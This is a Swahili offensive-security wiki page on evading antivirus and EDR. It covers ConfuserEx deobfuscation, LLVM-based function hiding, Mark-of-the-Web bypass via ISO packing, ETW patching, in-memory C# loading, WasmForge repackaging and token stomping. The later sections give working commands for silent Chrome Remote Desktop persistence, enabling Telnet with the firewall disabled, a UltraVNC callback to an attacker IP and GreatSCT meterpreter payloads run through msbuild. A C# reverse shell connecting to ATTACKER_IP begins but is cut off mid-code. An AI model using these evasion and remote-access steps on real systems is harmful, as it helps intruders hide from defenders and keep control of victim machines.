### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au fork za kibiashara), ni kawaida kukutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL inayokaribia kuwa ya awali**, ambayo baadaye inaweza kubadilishwa kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezewa – ConfuserEx husimba kila *method body* na kuifungua ndani ya constructor tuli ya *module* (`<Module>.cctor`). Pia hubadilisha PE checksum ili mabadiliko yoyote yasababisha binary kuacha kufanya kazi. Tumia **AntiTamperKiller** kutafuta metadata tables zilizosimbwa, kurejesha XOR keys, na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu unapotengeneza unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – ipeleke faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bendera:
     • `-p crx` – chagua wasifu wa ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls na wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kuzuia zaidi decompilation. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary iliyotokana nayo chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi malware huihifadhi kama byte array iliyosimbwa kwa TLV, iliyoanzishwa ndani ya `<Module>.byte_0`.

Mfuatano huu hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx hutengeneza custom attribute iitwayo `ConfusedByAttribute` inayoweza kutumiwa kama IOC kupanga samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya mkusanyiko wa LLVM [LLVM](http://www.llvm.org/) inayoweza kuongeza usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia uchakachuaji.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha code iliyofichwa wakati wa compilation, bila kutumia zana yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa, zinazozalishwa na mfumo wa C++ template metaprogramming, ambayo hufanya iwe vigumu kidogo zaidi kwa mtu anayetaka kuvunja application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya metamorphic code kwa executables zisizobainishwa.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa code obfuscation wa kiwango cha juu kwa lugha zinazoungwa mkono na LLVM, unaotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuvuruga dhana yetu ya kawaida kuhusu mtiririko wa udhibiti.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzisakinisha

### Kujificha kwa kila function kwa msaada wa LLVM compiler

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR kila zinapokuwa hazitumiki. Function Peekaboo PoC huchagua majina yaliyofanyiwa demangling yenye `REG_`, huingiza stubs za kuingia/kutoka zisizotegemea nafasi kuzunguka machine code ya mwisho, na kutoa handler moja ya pamoja ya kuficha katika `.text`; signatures za kiwango cha source na calling convention ya Windows x64 hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya control flow katika backend

Hii inapaswa kufanyika baada ya instruction selection na optimization kwa sababu mabadiliko haya lazima yajumuishe **kila return inayotolewa**, na yajue mpangilio halisi wa x86. `MachineFunctionPass` inayotekelezwa kabla ya emission hupata `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iendelee hadi kwenye epilogue iliyoongezwa, na kubadilisha returns zilizotangulia kuwa `JMP_1 handler`. Hifadhi uondoaji wowote wa stack/frame uliozalishwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya hatua za emission huruhusu branch ya prologue kulenga epilogue yake inayofuata; kwa `je` ya karibu inayotolewa mwenyewe, andika `0F 84` ikifuatiwa na MC expression ya baiti nne `target - address_after_je`. Calls na jumps kwenda kwa handler badala yake zinaweza kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function isiyochaguliwa ikiwa haikufanya mabadiliko yoyote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na uanzishaji kabla ya CRT

PoC huweka XOR key na records za baiti 16 zenye function pointer iliyohamishwa na loader pamoja na urefu wa runtime katika `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler husoma QWORD kwenye offset `+8` ya record, ikitumia urefu na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa baiti nane tu, kwa hiyo utafutaji wa runtime huona `.funcmet`. External patcher huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry-point ya zamani kwenye stub, na kuelekeza `AddressOfEntryPoint` upya; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia PE32+ imports ili kutafuta `VirtualProtect` ambayo tayari imeingizwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Uanzishaji huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huhifadhi mwanzo wa function katika `gs:[0xF0]`, hugundua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya kurudi iliyo kwenye `[rsp+0x68]` ndiyo mwisho wa function iliyobadilishwa, hivyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub hufuta sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler yuleyule wa pande mbili ili kufungua body. Njia ya mwisho huingia moja kwa moja kwenye epilogue iliyoongezwa, huku kila return ya awali ikiruka moja kwa moja hadi kwa handler wa pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, ili baada ya kuficha tena, `ret` ya handler itumie anwani ya kurudi ya caller wa awali na kuhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive ya kuficha na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue inayoonekana yenye urefu maalum (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hufanya XOR kwa kila byte kwa kutumia byte ya chini ya key, na kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo loop hiyo hiyo hufungua code inapoingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point iliyo ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizohamishwa;
- uchanganuzi wa PEB, import-table, na section-table kabla ya CRT, ukifuatiwa na calls kupitia kila pointer ya metadata;
- prologues zinazofanana za PIC za `call`/`pop` na return sites nyingi zinazoelekezwa kwa handler mmoja;
- writes kwenye `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatiwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na writes za XOR za kila byte kwenye executable pages zinazotegemea image.

Huu ni ukwepaji wa memory-scanner, si ulinzi wa cryptographic: file iliyopatchiwa bado ina body ya awali iliyo wazi, na debugger inaweza kusimama kwenye `VirtualProtect` au loop ya XOR na kutupa function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za thread moja, lakini code pages zilizorekebishwa zinashirikiwa na process nzima. Kwa hiyo, kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha tena instructions wakati invocation nyingine bado inatekelezwa; exceptions na exits zisizo za kawaida pia zinaweza kuruka hatua ya kuficha tena. Utekelezaji thabiti lazima usawazishe mabadiliko, urejeshe protection iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa kuwa thabiti, ukague njia za `call` na `jmp` kwa alignment ya stack ya x64, na uite `FlushInstructionCache` baada ya kuandika upya executable bytes. Microsoft hueleza wazi kwamba anayepiga function ndiye anayewajibika kuhakikisha coherency ya instruction-cache wakati executable code inarekebishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye mtandao na kuzitekeleza.

Microsoft Defender SmartScreen ni utaratibu wa usalama unaolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia zaidi mbinu inayotegemea sifa, ikimaanisha kwamba applications ambazo si za kawaida kupakuliwa zitaanzisha SmartScreen, na hivyo kumtahadharisha mtumiaji wa mwisho na kumzuia kutekeleza file (ingawa file bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua files kutoka kwenye mtandao, pamoja na URL ilikotoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file lililopakuliwa kutoka kwenye mtandao.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa cheti **kinachoaminika** cha kusaini **hazitaanzisha SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes **zisizo za NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads kwenye containers za matokeo ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii ni demo ya kubypass SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu wenye nguvu wa kuweka kumbukumbu za matukio kwenye Windows, unaowezesha programu na vipengele vya mfumo **kuweka kumbukumbu za matukio**. Hata hivyo, bidhaa za usalama zinaweza pia kuutumia kufuatilia na kutambua shughuli hasidi.

Sawa na jinsi AMSI inavyolemazwa (kubypassiwa), inawezekana pia kufanya function ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kuweka kumbukumbu za matukio yoyote. Hili hufanywa kwa kurekebisha function hiyo kwenye memory ili irudi mara moja, na hivyo kuzima uwekaji wa kumbukumbu za ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumekuwa kukijulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa diski, tutahitaji tu kuwa na wasiwasi wa kupatch AMSI kwa mchakato mzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza assemblies za C# moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha mchakato mpya wa muda**, kuingiza msimbo hasidi wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo huo hasidi na, ukimaliza, kuua mchakato mpya. Njia hii ina faida na hasara zake. Faida ya mbinu ya fork and run ni kwamba utekelezaji hufanyika **nje ya** mchakato wetu wa Beacon implant. Hii inamaanisha kwamba ikiwa jambo lolote katika hatua yetu ya post-exploitation litaharibika au kugunduliwa, kuna **uwezekano mkubwa zaidi** wa **implant yetu kunusurika.** Hasara ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **mifumo ya utambuzi wa tabia**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **ndani ya mchakato wake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuufanyia scan na AV, lakini hasara yake ni kwamba jambo likiharibika wakati payload yako inatekelezwa, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu mchakato unaweza kucrash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly repackaging of .NET tools (WasmForge)

Mbinu za kawaida za `execute-assembly` huhifadhi MSIL inayotambulika na hatimaye kuanzisha CLR. **WasmForge** hubadilisha mazingira ya utekelezaji badala yake: huhamisha mradi wa C# hadi kwenye target ya majaribio ya NativeAOT-LLVM WASI, huukompaili mapema kuwa WebAssembly, na kuingiza moduli hiyo kwenye PE host inayotumia Wazero. Mchakato unaotokana na hili hauhitaji CLR, JIT, au host ya `dotnet` ya target, kwa hiyo sheria zinazotegemea tu majina ya managed assembly, upakiaji wa CLR, AMSI, au .NET ETW hupoteza mwonekano wa moja kwa moja. Hii ni mbinu ya kukwepa ulinzi/kufungasha, si kubypass mpaka wa ruhusa—guest hubaki na ruhusa za zana ya awali na tabia yake ya OS inayoonekana.<sup>[[44]](#references)[[45]](#references)</sup>

### Building a C# project

Njia inayopendekezwa ya build ni mazingira ya Docker ya mradi, kwa kuwa yanajumuisha .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker, na dependencies za signing. `.csproj` hutambuliwa kiotomatiki; build ya hatua moja hufanya migration, patching ya compatibility, compilation ya WASM, uundaji wa PE, na signing.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Kwa utatuzi wa matatizo au ukaguzi wa msimbo uliotengenezwa, gawanya mchakato katika `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, na hatimaye `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Picha ya build pia hutumia wrapper ya `wasm-component-ld` ili kuepuka usimbaji wa component wa WASI Preview 2 na kutoa module ya kawaida inayotarajiwa na runtime iliyopachikwa.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunganisha wasm32 C# na x64 Win32

Hii si recompilation inayofanyika bila mabadiliko. NativeAOT-WASI haina au hubadilisha vipengele vya BCL vinavyolenga Windows, na guest ya wasm32 kwa kawaida hutenga nafasi za pointer za baiti nne, ilhali API za x64 zinaweza kurudisha pointer za baiti nane. WasmForge hushughulikia matatizo haya yote mawili kwa kutumia tabaka zifuatazo zinazozalishwa:<sup>[[44]](#references)</sup>

1. Source patcher hurekebisha tofauti za kisemantiki mahususi kwa AOT na kuelekeza upya miito isiyoungwa mkono ya registry, pipes, WMI, identity, directory-service, file-version, LSA, na mingineyo kwa wasaidizi wa `Wf*`.
2. P/Invoke scanner huzalisha mappings za NativeAOT `DirectPInvoke` ili miito ya `[DllImport]` iunganishwe na alama za C bridge zilizounganishwa badala ya kupakia DLL iliyotajwa ndani ya guest kwa njia inayobadilika.
3. Pointer zinazolenga host hutumia `ulong` katika C# na `uint64_t` katika C. Dispatcher ya jumla hupeleka miito kwa handler ya Win32 ya host; `out8_mask` huashiria nafasi halisi za matokeo za baiti nane ambazo nusu zake za juu lazima zihifadhiwe. Matokeo yasiyo na alama yenye umbo la wasm32 hutumia ulinzi wa snapshot/restore ili maandishi ya x64 yasiharibu baiti nne zilizo karibu.
4. Host bridges maalum hushughulikia utendakazi usiofaa kwa dispatch ya jumla ya syscall, kama vile ufikiaji wa akiba ya tiketi za LSA, utendakazi wa Kerberos/BCrypt wenye matokeo yenye muundo, trafiki ya TCP KDC, na maswali ya LDAP.

Kwa mfano, wrapper ya `version.dll!VerQueryValueW` hupitisha anwani nne za host na kuweka biti 2 na 3 (`0xC`) kwa sababu pointer ya value na urefu ni nafasi za matokeo za baiti nane. Wrapper yenyewe hubaki ya jumla na hukabidhi jina la DLL, jina la export, hoja na mask kwa `wf_call_v2`; host hufanya tafsiri ya pointer na kuita API asilia.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Vikwazo na viashiria vya kugundua

Msimbo unaotumia sana Reflection, upakiaji wa dynamic assembly, callbacks za native zisizo na mipaka, na miundo changamano ya x64 inayorejeshwa kwenye memory ya WASM bado unaweza kuhitaji patches mahususi kwa kila tool au kushindwa kabisa. Sockets za jumla za WASI Preview 2 pia zinaweza kuelekezwa kwenye no-op stubs, kwa hivyo tools zinazotumika hutumia host shims mahususi kwa kila protocol. Thibitisha kila amri dhidi ya native build badala ya kudhani kuwa vipengele vyake vinafanana.<sup>[[44]](#references)[[45]](#references)</sup>

Mbinu hii huhamisha telemetry badala ya kufanya payload isionekane. Ugunduzi unaweza kuelekezwa kwenye PE iliyo na au inayounda WASM module, tabia inayofanana na runtime ya Wazero, ugawaji na unakili wa memory usio wa kawaida kati ya host na guest, uelekezaji wa jumla wa moja kwa moja wa Win32, hitilafu za signing na PE-resource, pamoja na API calls na trafiki ya mtandao inayotokana nazo. Kwa hiyo, kutokuwepo kwa matukio ya CLR-load, AMSI au .NET ETW hakupaswi kuchukuliwa kama ushahidi kwamba process haina madhara.<sup>[[44]](#references)</sup>

## Kutumia Lugha Nyingine za Programming

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na mshambuliaji**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yaliyo kwenye SMB share, unaweza **kutekeleza msimbo wowote wa lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP, n.k., tunapata **unyumbufu zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell zisizo obfuscated na zilizochaguliwa bila mpangilio katika lugha hizi yamefanikiwa.

## Kuendesha tena WebAssembly ili kukwepa static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza privileges za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kufanya ukaguzi au hatua za kurekebisha zinazohitaji privileges.

Ili kuzuia hili, Windows inaweza **kuzuia processes za nje** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa kwenye [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha bofya faili la MSI la Windows ili kupakua faili la MSI.
2. Endesha installer bila kuonyesha dirisha kwenye mashine ya mwathiriwa (unahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza amri iliyotolewa ukiwa umefanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Kukwepa Ugunduzi kwa Kina

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Kukwepa ugunduzi ni mada changamano sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry kwenye mfumo mmoja tu, kwa hiyo karibu haiwezekani kubaki bila kugunduliwa kabisa katika mazingira yaliyokomaa.

Kila mazingira unayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate mwanzo wa kujifunza mbinu za Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Hili pia ni wasilisho jingine zuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu gani Defender hutambua kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **itaondoa sehemu za binary** hatua kwa hatua hadi **itagundua ni sehemu gani Defender** inatambua kuwa hasidi, kisha itakutenganishia sehemu hiyo.\
Tool nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), yenye huduma ya wazi ya wavuti kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama msimamizi) kwa kufanya:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Iweke **ianze** mfumo unapowashwa na **uiendeshe** sasa hivi:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet (kwa kujificha) na uzime firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji upakuaji wa bin, si setup)

**KWENYE HOST**: Endesha _**winvnc.exe**_ na usanidi seva:

- Washa chaguo la _Disable TrayIcon_
- Weka nenosiri kwenye _VNC Password_
- Weka nenosiri kwenye _View-Only Password_

Kisha, hamishia binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ iliyoundwa **hivi punde** ndani ya **victim**

#### **Muunganisho wa kurudi**

**Mshambuliaji** anapaswa **kuendesha ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **muunganisho wa kurudi wa VNC**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na uendeshe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` kwenye saraka hiyo hiyo, la sivyo [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) litafunguka
- Usiendeshe `winvnc -h` kupata msaada, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender ya sasa itasitisha process haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
